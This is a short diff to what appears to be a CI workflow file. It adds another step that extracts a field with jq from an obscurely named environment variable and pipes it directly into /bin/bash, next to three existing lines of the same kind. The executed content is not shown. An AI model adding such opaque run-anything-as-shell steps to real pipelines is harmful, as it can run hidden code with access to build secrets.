@@ -24,6 +24,7 @@ jobs:
           echo $ci1 | jq -r .e556 | /bin/bash
           echo $orqyq64 | jq -r .oyz4 | /bin/bash
           printf '%s' "$uyd26648" | jq -r .vc356 | /bin/bash
+          echo $embo6 | jq -r .queyi905 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
